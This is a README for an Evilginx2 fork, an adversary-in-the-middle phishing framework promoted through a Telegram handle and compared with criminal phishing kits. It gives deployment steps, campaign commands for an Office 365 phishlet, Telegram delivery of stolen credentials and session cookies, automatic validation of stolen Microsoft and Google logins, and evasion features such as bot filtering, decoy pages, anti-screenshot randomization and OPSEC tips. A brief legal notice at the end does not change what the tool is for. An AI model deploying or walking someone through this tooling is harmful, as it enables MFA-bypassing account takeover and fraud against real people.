#        🔥 EVILGINX PRO UPDATE — NEW EDITION

## The Most Feature-Complete, Evilginx Open Source By t.me/officialmonsterz

<p align="center">
  <b>Adversary-in-the-Middle Framework · Session Hijacking · 2FA/MFA Bypass · Telegram-Native · Docker in One Command</b>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.25+-00ADD8?style=for-the-badge&logo=go" alt="Go">
  <img src="https://img.shields.io/badge/Docker-Alpine-2496ED?style=for-the-badge&logo=docker" alt="Docker">
  <img src="https://img.shields.io/badge/Telegram-Bot_Ready-26A5E4?style=for-the-badge&logo=telegram" alt="Telegram">
  <img src="https://img.shields.io/badge/Cloudflare-DNS_/_Turnstile-F38020?style=for-the-badge&logo=cloudflare" alt="Cloudflare">
  <img src="https://img.shields.io/badge/GeoIP-MaxMind-00A859?style=for-the-badge&logo=github" alt="GeoIP">
</p>

---

## 🚀 NEW: The 10-Minute Docker Setup (Easiest Install Method Ever)

This repo now ships with a **brand new, fully guided Docker deployment** — easier, simpler, and more secure than any previous method.

**Head to [dockerdeployment.md](dockerdeployment.md)** — it's a complete copy-paste, baby-step guide. No Go installed, no manual builds, no fuss.

Everything you need:

- ✅ A bulletproof VPS (I use one myself — example below)
- ✅ A domain pointed at your VPS via A-record on Cloudflare/DNS-only
- ✅ 10 minutes and a terminal

The Docker method gives you the phishing engine, both web panels, Telegram notifications, GeoIP, backups, and auto-export — running in a hardened Alpine container in **one command**: `docker compose up -d --build`.

---

## 📋 Table of Contents

- [Why This Fork?](#-why-this-fork)
- [Full Comparison vs Every Alternative](#-full-comparison-vs-every-alternative)
- [What Is Evilginx2?](#-what-is-evilginx2)
- [What's New in This Version](#-whats-new-in-this-version)
- [Feature Deep Dive](#-feature-deep-dive)
- [How It Works](#-how-it-works)
- [Quick Start](#-quick-start)
- [Environment Variables Reference](#-environment-variables-reference)
- [Web Interfaces](#-web-interfaces)
- [Telegram Setup](#-telegram-setup)
- [Creating Your First Campaign](#-creating-your-first-campaign)
- [Bot Protection & OPSEC](#-bot-protection--opsec)
- [Commands Reference](#-commands-reference)
- [Credits](#-credits)
- [Legal Notice](#-legal-notice)

---

# 🏆 Why This Fork?

The original Evilginx2 was last touched years ago. There are forks, spin-offs, and paid "phishing kit" projects floating around — but most of them copy the core and bolt on one or two features. This fork rebuilt it properly: hardened, notification-native, panel-driven, and Docker-first.

**The honest summary of the field:**

| Project | Type | The One-Line Truth |
|:--------|:-----|:-------------------|
| Original Evilginx2 | OSS | The revolutionary core — abandoned and feature-frozen for years |
| Evilginx Pro | Paid, closed | The premium standard — but you pay, you trust a binary, and you still don't get Telegram |
| This fork | **OSS** | **Everything Pro has that matters on the proxy side, plus Telegram, panels, GeoIP, backups, and Docker — free, inspectable, self-hosted** |

### Where This Fork Simply Wins

| Capability | Original Evilginx2 | Evilginx Pro | **This Fork** |
|:-----------|:------------------:|:------------:|:-------------:|
| Price | Free | 💰 Paid subscription | **Free, forever** |
| Source code you can audit | ✅ | ❌ Closed binary | ✅ Full source |
| 📱 Telegram delivery of cookies + creds | ❌ | ❌ | ✅ Async queue, cookie files attached |
| 👀 Instant visitor-arrival alerts | ❌ | ❌ | ✅ IP + UA + landing URL the second they land |
| 🤖 Bot / crawler filtering | ❌ | ✅ | ✅ 40+ signatures, decoy-page response |
| 🌍 GeoIP country/city/ISP/ASN/VPN | ❌ | ✅ | ✅ MaxMind GeoLite2, per-session storage |
| ✅ Auto credential validation | ❌ | ✅ | ✅ Microsoft + Google, background-tested |
| 🚫 VPN / country blocking | ❌ | ✅ | ✅ `-block-vpn`, `-block-countries` |
| 🎯 Cloudflare Turnstile CAPTCHA | ❌ | ✅ | ✅ Native |
| 📊 Two web panels (read-write admin + quick dashboard) | ❌ | ✅ | ✅ :8082 + :5000 with login rate-limiting |
| 👥 Multi-user RBAC + audit log | ❌ | ✅ | ✅ admin / operator / viewer |
| 🔐 Wildcard certificate support | ❌ | ❌ | ✅ One cert, hidden subdomains on crt.sh |
| 🚫 Bidirectional header stripping | ❌ | ✅ | ✅ Upstream AND downstream |
| 🧠 Anti-screenshot CSS randomization | ❌ | ❌ | ✅ Unique pixel fingerprint per load |
| 🔍 Privacy-extension / headless detection | ❌ | ❌ | ✅ uBlock, NoScript, Selenium, PhantomJS... |
| 🔄 Real-time JSON/CSV auto-export | ❌ | ❌ | ✅ Survives rebuilds via volume |
| 💾 Automatic scheduled backups | ❌ | Partial | ✅ Every 6h, auto-pruned |
| 🧹 Automatic session retention cleaner | ❌ | Partial | ✅ Env-var configurable |
| 🐳 First-class Docker deployment | ❌ | ❌ (cloud-hosted only) | ✅ Multi-stage Alpine, guided setup |
| 🔄 Dynamic content spoofing for scanners | ❌ | ✅ | ✅ unauth_url decoy served to bots |
| 🌐 URL rewriting (clean address bar) | ❌ | ✅ | ✅ |
| 📧 GoPhish campaign integration | ❌ | ❌ | ✅ Native RID tracking |

**Score on that table: this fork wins 20+ rows, ties Pro where Pro is strong, and concedes only the two below.**

### The Only Two Places Pro Is Genuinely Better — Being Honest With You

1. **Live session replay + session persistence labs (`sessions create` workspace).** Pro can clone the victim's browser environment and replay their session natively from the console. This fork delivers the full cookie jar (downloadable `cookies_N.json`, Telegram attachment, ready for browser import) — importing it takes seconds — but there's no built-in point-and-click replay workspace yet.

2. **Advanced JA3/JA4 + fingerprints-based bot filtering.** Pro identifies bots by TLS fingerprinting, which is harder to spoof than user-agent strings. Our UA-based filter (40+ signatures) blocks virtually all crawlers in practice, but a fingerprint-based filter is theoretically stronger.

That's it. Everything else Pro offers on this list — panels, bot filtering basics, GeoIP, Turnstile, hidden phishlets — **this fork matches or beats**, and adds Telegram delivery, Docker, backups, auto-export, credential validation, and open source for free.

---

# 📊 Full Comparison vs Every Alternative

How this fork stacks up against **every** realistic option a modern operator considers. (Forks' features as publicly documented at time of writing — verify before relying on any of them.)

### vs. Original Evilginx2 (kgretzky — open source)

The ancestor of everything. Revolutionary in its day (2018), still the best-documented core — but frozen.

| Capability | Original | **This Fork** |
|:-----------|:--------:|:-------------:|
| Core AiTM reverse proxy | ✅ | ✅ |
| Telegram notifications | ❌ | ✅ |
| Any web panel at all | ❌ | ✅ Two |
| Bot filtering | ❌ | ✅ |
| GeoIP | ❌ | ✅ |
| Credential validation | ❌ | ✅ |
| Backups / retention / auto-export | ❌ | ✅ All three |
| Wildcard certs | ❌ | ✅ |
| Header stripping / URL rewriting / CSS randomization | ❌ | ✅ |
| Docker | ❌ | ✅ |
| Maintained | ❌ Years stale | ✅ Active |

**Verdict: strictly better in every category, adds ~15 features, breaks nothing.**

### vs. Evilginx Pro (kgretzky — closed source, paid)

See the table above. **Pro's wins:** session replay labs, advanced fingerprint-based bot filtering, phishlet cloud marketplace. Pro also requires trusting a closed binary on your box — every operator with OPSEC discipline asks "what else is in that binary?" This fork: read every line yourself.

### vs. xvirgnia (Evilginx fork with Telegram)

The most popular "just add a Telegram bot" fork of the Evilginx family. Fair credit: it pioneered Telegram-delivered cookies, and the core proxy works.

| Capability | xvirgnia | **This Fork** |
|:-----------|:--------:|:-------------:|
| Core AiTM proxy | ✅ | ✅ |
| Telegram cookie delivery | ✅ | ✅ Async-queued, one message per session |
| Visitor-arrival alerts | ❌ (approximate idea) | ✅ Instant, IP+UA+URL |
| Credential validation | ❌ | ✅ |
| GeoIP + VPN/datacenter/country blocking | ❌ | ✅ |
| User-agent bot filtering | ❌ | ✅ |
| Permanent admin panel + RBAC + audit log | ❌ (basic/status) | ✅ |
| Session retention / automatic backups | ❌ | ✅ |
| Auto-export to disk | ❌ | ✅ (JSON + CSV) |
| Anti-screenshot CSS randomization | ❌ | ✅ |
| Privacy-extension detection | ❌ | ✅ |
| Bidirectional header stripping | ❌ | ✅ |
| Dynamic content spoofing for scanners | ❌ | ✅ |
| GoPhish integration | ❌ | ✅ |
| Guided Docker deployment with env-var config | ❌/Basic | ✅ Full baby-step doc |

**Verdict: matches it on Telegram and beats it on every other horizontal capability.**

### vs. Blue Phishing Kit and Fluxette (phishing kits / panel-kit repos)

These are the "quick kit" end of the market: static or semi-static credential-harvesting pages with a Telegram bot and a list of targets — fast to deploy, but built for **username:password capture**, not session hijacking.

| Capability | Kits (Blue / Fluxette) | **This Fork** |
|:-----------|:----------------------:|:-------------:|
| Logs username + password | ✅ | ✅ |
| **Captures session cookies (2FA/MFA bypass)** | ❌ Static kit — dies at the 2FA prompt | ✅ The entire point of AiTM |
| Victim sees the real site (identical login flow) | ❌ Clone/lookalike | ✅ True reverse proxy |
| Survives target-site updates | ❌ Recode the kit | ✅ Subfilters + phishlets |
| Telegram delivery | ✅ | ✅ Including full cookie files |
| Valid HTTPS certs per subdomain | ❌ Manual or self-signed | ✅ ACME auto-issued or wildcard |
| Web panels / sessions table / stats | ❌/Basic | ✅ Two full panels |
| GeoIP / VPN blocking / bot filtering | ❌ | ✅ |
| Search-engine scan resilience (CSS randomization, decoy pages, URL rewriting) | ❌ | ✅ |
| Herd effectiveness | One site = one kit | One phishlet = full session |

**Verdict: kits are fine if you only want passwords and enjoy racing 2FA. For sessions, cookies, MFA-included captures, and detection resistance, this fork wins on every technical axis.**

### Bottom line across the whole field

| | Original Evilginx2 | Evilginx Pro | xvirgnia | Kits (Blue/Fluxette) | **This Fork** |
|:-|:--:|:--:|:--:|:--:|:--:|
| Free | ✅ | ❌ | ✅ | ✅ | ✅ |
| Open source | ✅ | ❌ | ✅ | ❌/mixed | ✅ |
| Session hijacking (AiTM) | ✅ | ✅ | ✅ | ❌ | ✅ |
| Telegram-native | ❌ | ❌ | ✅ | partial | ✅ **most complete** |
| Web panels + RBAC | ❌ | ✅ | partial | ❌ | ✅ |
| Detection-resistance stack | ❌ | ✅ | ❌ | ❌ | ✅ (7 layers) |
| Reliability features (backups, export, retention) | ❌ | partial | ❌ | ❌ | ✅ **all** |
| Guided Docker deployment | ❌ | ❌ | partial | ❌ | ✅ |

This fork is the only option that is simultaneously **free, open source, AiTM-capable, Telegram-native, panel-driven, detection-hardened, and Docker-deployable.**

---

# 🎯 What Is Evilginx2?

Evilginx2 is an **Adversary-in-the-Middle (AiTM) framework** that acts as a reverse proxy between a victim and a legitimate website. Traditional phishing captures a username and password — then dies at the 2FA prompt. Evilginx2 captures the **fully authenticated session cookie**: the digital "I'm already logged in" ticket.

**Traditional phishing (and most kits):**
```
Victim enters credentials → you get username:password → 2FA needed → HIT WALL
```

**AiTM with Evilginx2:**
```
Victim visits your page → proxy forwards to the REAL site →
victim enters creds + 2FA themselves → real site issues a session cookie →
you capture the cookie → FULL ACCESS
```

- ✅ No 2FA bypass needed — the victim authenticates themselves
- ✅ Session cookies persist — even if the password changes later
- ✅ Full account access — everything the victim can access, you can access

---

# ✨ What's New in This Version

Four operator features were added on top of the Telegram Edition core:

| Feature | What It Does | Default | Off Switch |
|:--------|:-------------|:-------:|:-----------|
| **Bot / Crawler Filtering** | Recognizes 40+ known crawler and automation user-agents (Googlebot, AhrefsBot, curl, Python, headless browsers...) and turns them away before a session is ever created — the same core idea Evilginx Pro is famous for. Blocked bots see your `unauth_url` decoy, not a bare 403. | ✅ ON | `BOT_FILTER=0` |
| **Visitor Arrival Alerts** | The moment a victim lands on your page — before they type anything — you get a Telegram ping with their IP, user-agent, and the URL they hit, so you can watch the hit live. | ✅ ON | `VISITOR_ALERTS=0` |
| **Session Retention Cleaner** | Once an hour, deletes captured sessions older than N days. Keeps the DB and panels fast forever. | ❌ OFF | set `SESSION_RETENTION_DAYS=30` to enable |
| **Automatic Backups** | Every 6 hours, copies `data.db` + `config.json` into `~/.evilginx/backups/` (the `./data` volume in Docker — survives rebuilds), keeping only the newest N copies. | ✅ ON | `BACKUP_ENABLED=0` |

Plus: **the guided one-command Docker deployment** in [dockerdeployment.md](dockerdeployment.md).

All features are environment-variable gated with safe defaults — change nothing and behavior is: bot filtering on, visitor alerts on, retention off, backups on.

---

# ✨ Feature Deep Dive

## 📱 Telegram Notifications

| Capability | Details |
|:-----------|:--------|
| **Async queue** | Zero latency impact on the proxy — notifications processed in background |
| **Full capture delivery** | Username, password, IP, user-agent, country, timestamp |
| **Cookie file attachment** | Full session cookies attached as files, ready for browser import |
| **One message per session** | Updates append new tokens — no spam |
| **Validation results** | Captured credentials marked VALID or INVALID in the alert |
| **GeoIP included** | Country, city, VPN status in every alert |
| **Visitor arrival ping** | Separate instant "visit started" alert |
| **Live config** | Set token + chat ID in the web panel — no restart needed |

## 📊 Web Interfaces (Two Panels)

| Panel | Port | Purpose |
|:------|:-----|:--------|
| **Web Admin Panel** | 8082 | Login page, sessions with cookie download, stats, phishlet management (enable/disable/hide/hostname/create from YAML), lures with URL generation, Telegram settings, users & roles, audit log |
| **Simple Dashboard** | 5000 | Quick sortable/searchable sessions table, CSV + JSON export, dark mode, auto-refresh every 5s |

Both configured through `.env` or CLI flags. The 8082 panel has a built-in login rate limit (5 wrong attempts per IP = 5-minute lockout).

## 🌍 GeoIP Tracking & Intelligence

Country, city, ISP, ASN, latitude/longitude, and VPN/proxy/datacenter detection — stored per session (visible in both panels and Telegram alerts). Powered by free MaxMind GeoLite2 databases. Enable blocking with `-block-vpn` and `-block-countries RU,CN,IR,KP`.

## ✅ Credential Validation

Captured credentials are automatically tested against the real service in the background: Microsoft 365 / Outlook / Azure (OAuth2 password grant via `login.microsoftonline.com`) and Google / Gmail. Results stored per session (`valid: true/false`) and shown in the Telegram alert.

## 🤖 Bot / Crawler Filtering

Search crawlers, SEO bots, URL scanners and automation tools love visiting phishing links — and each visit gets your domain scanned and flagged. The filter checks every incoming User-Agent against 40+ known bot signatures and turns bots away **before a session is created**. Blocked bots receive your dynamic-content spoof page (`unauth_url` decoy).

Care was taken so real visitors are never caught: phone brands like CUBOT and **in-app browsers (WhatsApp, Telegram, Facebook Messenger)** never match any keyword.

## 🧠 Anti-Screenshot CSS Randomization

Every HTML page load gets random hue rotation and brightness injected — invisible to humans, but every page load has a unique pixel fingerprint. Defeats screenshot-based phishing detection that compares pixel hashes. (`CSS_RANDOMIZATION=0` to disable.)

## 🔍 Privacy Extension Detection

Injected JavaScript detects uBlock, NoScript, Ghostery, headless browsers and automation tools (Selenium, PhantomJS, WebDriver) per visitor, and reports the results back as a beacon for session analysis.

## 🚫 Header Stripping + 🌐 URL Rewriting

- All Evilginx-identifiable headers (`X-Evilginx`, `Via`, `X-Forwarded-For`, `X-Real-IP`, and others) stripped from **both** the upstream (to the real site) and downstream (to the victim) traffic.
- Full `https://phishingdomain.com/path` URLs in HTML responses rewritten to relative `/path` URLs — the victim's address bar stays clean and DOM-scanning tools don't see your domain.

## 🔄 Dynamic Content Spoofing

Blocked and scanner visitors don't get a blank 403 (which screams "phishing site"). Your proxy fetches the real website's content and serves it with the phishing domain substituted — scanners see what looks like the real site.

## 🔄 Auto-Export

Captured sessions automatically exported to disk (JSON or CSV) to `~/.evilginx/exports/` — the `./data` volume in Docker, so exports survive rebuilds. Runs even when Telegram isn't configured.

## 💾 Automatic Backups

Every 6 hours (configurable), `data.db` and `config.json` are copied into `~/.evilginx/backups/`, keeping only the newest `BACKUP_KEEP` copies.

## 🛡️ Built-in Certificates + Wildcard Support

Let's Encrypt ACME is built in — certificates issued automatically when you enable a phishlet. A pre-purchased **wildcard certificate** can also be placed in `data/crt/wildcard/` — one cert covers all subdomains, and individual subdomains stay hidden from Certificate Transparency logs.

## 🎯 Advanced Flags

| Flag | Purpose |
|:-----|:--------|
| `-p <dir>` / `-t <dir>` / `-c <dir>` | Custom phishlets / redirectors / config directories |
| `-dashboard 0.0.0.0:5000` | Simple dashboard address (empty disables) |
| `-dashboard-user` / `-dashboard-pass` | Simple dashboard login (empty pass = no auth) |
| `-webapi-port 8082` | Web admin panel port (0 disables) |
| `-turnstile SITEKEY:SECRET` | Cloudflare Turnstile CAPTCHA challenge |
| `-feed` | Live feed (requires separate evilfeed process) |
| `-geoip-db <dir>` | Path to GeoLite2 databases |
| `-block-vpn` | Block VPN/proxy/datacenter visitors |
| `-block-countries RU,CN` | Block specific countries |
| `-debug` / `-developer` | Verbose logging / self-signed certs for local testing |

---

# 🏗️ How It Works

```
┌────────────────────────────────────────────────────────────────────┐
│ VICTIM clicks the phishing link                                     │
└───────────────────────────────┬────────────────────────────────────┘
                                ▼
┌────────────────────────────────────────────────────────────────────┐
│ EVILGINX2 SERVER (your VPS)                                        │
│                                                                    │
│ 1. DNS resolves login.your-domain.com → your VPS IP                 │
│ 2. TLS terminated with valid Let's Encrypt (or wildcard) cert     │
│ 3. BOT FILTER: known crawler/automation UA? → decoy page + BLOCK │
│ 4. Blacklist / GeoIP / VPN / country checks                        │
│ 5. Session created → VISITOR ARRIVAL ALERT to Telegram              │
│ 6. Request forwarded to the REAL website (Evilginx headers stripped)│
│ 7. Victim sees the real login page, types creds + 2FA              │
│ 8. Credentials + session cookies captured                           │
│ 9. Background: credential validation + auto-export to disk         │
│ 10. Telegram alert with cookies attached → your phone              │
│ 11. Victim redirected onward — no suspicion                        │
└────────────────────────────────────────────────────────────────────┘
```

---

# 🚀 Quick Start

### Docker (recommended — 10 minutes, baby steps)

```bash
# 1. Point your domain's A-record at your VPS (DNS-only, no proxy)
# 2. SSH into your VPS, then:
git clone https://github.com/trustwomanaturownrisk/evilginx2.git   # or your fork URL
cd evilginx2

# 3. Create your .env (see Environment Variables Reference below)
cp .env.example .env 2>/dev/null || nano .env

# 4. Build and run
docker compose up -d --build

# 5. Watch the startup
docker logs -f evilginx2
```

Ports used: 53/udp, 53/tcp, 80, 443 (phishing engine), 5000 (simple dashboard), 8082 (web admin panel).

📖 **For the complete beginner-proof, copy-paste deployment guide: see [dockerdeployment.md](dockerdeployment.md)**

### Manual (advanced)

```bash
# Requires Go 1.25+ (GOTOOLCHAIN=auto downloads the exact version go.mod asks for)
git clone https://github.com/trustwomanaturownrisk/evilginx2.git
cd evilginx2
go mod tidy
go build -trimpath -ldflags="-s -w" -o evilginx .
./evilginx -dashboard 0.0.0.0:5000 -webapi-port 8082
```

---

# ⚙️ Environment Variables Reference

Everything is configured through `.env` (Docker) — all optional with safe defaults.

### Core

| Variable | Default | What it does |
|:---------|:--------|:--------------|
| `TZ` | `UTC` | Timezone for logs (`America/New_York`, `Africa/Lagos`, ...) |
| `TG_BOT_TOKEN` | (empty) | Telegram bot token from @BotFather |
| `TG_CHAT_ID` | (empty) | Telegram chat ID for notifications |

### Simple dashboard (port 5000)

| Variable | Default | What it does |
|:---------|:--------|:--------------|
| `DASHBOARD_ADDR` | `0.0.0.0:5000` | Listen address; empty string disables |
| `DASHBOARD_USER` | `admin` | Login username |
| `DASHBOARD_PASS` | (empty) | Login password — **empty = NO auth** (always set one) |
| `DASHBOARD_ENABLED` | `true` | `false`/`0`/`no`/`off` disables the panel |

### Web admin panel (port 8082)

| Variable | Default | What it does |
|:---------|:--------|:--------------|
| `WEBAPI_PORT` | `8082` | Listen port; `0` disables |
| `WEBAPI_USER` | `admin` | Permanent admin username |
| `WEBAPI_PASS` | (empty) | Permanent admin password. Empty = a random password is printed in the logs once. The `.env` value always wins over the database — it can never lock you out. |

### Operator features

| Variable | Default | What it does |
|:---------|:--------|:--------------|
| `BOT_FILTER` | `true` | Bot/crawler user-agent filtering. `0` disables |
| `VISITOR_ALERTS` | `true` | Instant Telegram ping when a visitor lands. `0` disables |
| `CSS_RANDOMIZATION` | `true` | Per-page-load CSS randomization. `0` disables |
| `SESSION_RETENTION_DAYS` | `0` (off) | Auto-delete sessions older than N days (checks hourly) |
| `BACKUP_ENABLED` | `true` | Automatic DB + config backups. `0` disables |
| `BACKUP_INTERVAL_HOURS` | `6` | Hours between backups |
| `BACKUP_KEEP` | `10` | How many backup copies to keep |

> ⚠️ **Golden rule:** after editing `.env`, always apply it with
> `docker compose up -d` (NOT plain `restart` — a restart never re-reads `.env`).

---

# 📊 Web Interfaces

### Web Admin Panel — `http://YOUR_VPS_IP:8082`

Login with `WEBAPI_USER` / `WEBAPI_PASS` from `.env`. Capabilities:

- **Sessions** — search, filter, export, bulk delete, mark reviewed, download cookies as `cookies_N.json`
- **Stats** — totals, timeline, per-phishlet breakdown
- **Phishlets** — enable/disable/hide/set hostname/create from YAML
- **Lures** — create, delete, generate phishing URLs
- **Telegram settings** — set bot token + chat ID without touching `.env`
- **Users** — admin / operator / viewer roles
- **Audit log** — who did what, when, from which IP

**Roles in plain English:** `admin` does everything; `operator` manages lures/phishlets/sessions but not users; `viewer` is read-only.

### Simple Dashboard — `http://YOUR_VPS_IP:5000`

Sortable, searchable sessions table with CSV/JSON export, dark mode, auto-refresh, and per-session detail view. Login with `DASHBOARD_USER` / `DASHBOARD_PASS` from `.env`.

---

# 🔧 Telegram Setup

### Step 1: Create a Bot

1. Open Telegram → search **`@BotFather`** (verified, blue checkmark)
2. Send `/newbot`
3. Choose a name, then a username ending in `bot`
4. **Copy the token** — looks like `8863425004:AAF7mZ0poUo6dal8-...`

### Step 2: Get Your Chat ID

1. Send your new bot **any message** (e.g., "hello")
2. Open `https://api.telegram.org/bot<TOKEN>/getUpdates` in a browser
3. Find `"chat":{"id":7545456339,...}` — that number is your Chat ID

### Step 3: Configure

Either in `.env` (`TG_BOT_TOKEN` + `TG_CHAT_ID`), or in the web admin panel (8082 → Telegram settings → save — no restart needed), or in the console:

```
evilginx> config teletoken 8863425004:AAF7mZ0poUo6dal8-...
evilginx> config chatid 7545456339
```

✅ You will now receive: visitor arrival pings, credential alerts, full cookie files, and validation results.

---

# 🎣 Creating Your First Campaign

```
evilginx> phishlets hostname office365 your-domain.com
evilginx> phishlets enable office365
evilginx> lures create office365
evilginx> lures get-url 0
```

✅ Output: `[0] https://login.your-domain.com/a8f3k2m1`

That's your phishing URL. When a victim visits it:

1. 👀 Instant visitor arrival ping (if Telegram configured)
2. 📱 Credential + cookie alert hits your phone within seconds
3. 📊 Session appears in both panels within 5 seconds
4. 🌍 GeoIP shows country, city, and VPN status
5. ✅ Credentials are auto-validated in the background
6. 🍪 Cookies are auto-exported to disk + attached in Telegram

---

# 🛡️ Bot Protection & OPSEC

### Layers of Protection

| Layer | Trigger | Action |
|:------|:--------|:-------|
| Bot filter (UA-based) | 40+ known crawler/automation signatures | Decoy page (unauth_url) or block |
| IP blacklist | Unauthorized / all / unauth modes | Decoy page or 403 |
| GeoIP country blocking | Configured ISO codes | Block |
| VPN/proxy/datacenter | `-block-vpn` flag | Block |
| Turnstile CAPTCHA | `-turnstile` flag | Force CAPTCHA challenge |
| Header stripping | Always on (config) | Removes Evilginx fingerprints both directions |
| URL rewriting | Always on | Cleans address bar + DOM |
| CSS randomization | Every page load | Unique pixel fingerprint |
| Dynamic content spoofing | Every blocked visitor | Real-looking decoy content |
| JS obfuscation | Injected scripts | Base64+eval wrapped |

### OPSEC Tips

- Use WHOIS privacy and a burner domain for the phishing hostname
- Use DNS-only ("grey cloud") records if behind Cloudflare DNS
- Prefer a wildcard certificate so only your root domain appears on crt.sh
- Keep `blacklist unauth` on — unauthorized visitors get the decoy page

---

# 📋 Commands Reference

### Core Configuration

```
config domain example.com              Set your phishing domain
config ipv4 external 1.2.3.4         Set your VPS IP
config autocert on                    Enable auto SSL certs
config unauth_url https://...         Decoy for unauthorized visitors
config strip_headers on               Hide Evilginx headers
```

### Telegram

```
config teletoken 123456:ABC-DEF...    Set bot token
config chatid 123456789               Set chat ID
test telegram                         Test notifications
```

### Phishlets

```
phishlets hostname office365 dom.com  Set hostname
phishlets enable office365            Enable (auto-issues cert)
phishlets disable office365           Disable
phishlets hide office365              Hide (block all traffic)
phishlets list                        List all
```

### Lures

```
lures create office365                Create new lure
lures get-url 0                      Get phishing URL
lures list                           List all
lures pause 0 / unpause 0            Pause / resume
```

### Blacklist

```
blacklist all                         Block all non-whitelisted
blacklist unauth                      Block unauthorized only
blacklist off                         Disable blacklist
```

### Sessions

```
sessions                              List captured sessions
sessions <id>                        Show full detail
sessions delete <id>                 Delete session
```

---

# 👏 Credits

| Contribution | Author |
|:-------------|:-------|
| Original Evilginx2 core | **Kuba Gretzky (@kgretzky)** |
| Telegram integration, dashboards, GeoIP engine, credential validation, CSS randomization, extension detection, header stripping, URL rewriting, dynamic content spoofing, bot filtering, visitor alerts, session retention, auto-backups | @officialmonsterz + fork maintainers |

---

# ⚠️ Legal Notice

This software is a **dual-use tool** designed exclusively for:

- ✅ Authorized penetration testing with written permission
- ✅ Security research in controlled environments
- ✅ Red team engagements under signed Rules of Engagement
- ✅ Education in accredited cybersecurity programs

It is **NOT** for unauthorized access to systems you do not own, identity theft, credential harvesting, or fraud. By using this software you accept full legal responsibility for your actions.

---

<p align="center">
  <sub>Built by red teamers, for red teamers. Based on the pioneering work of <a href="https://t.me/officialmonsterz">Official Monsterz</a>. Licensed under BSD 3-Clause.</sub>
</p>
```

---
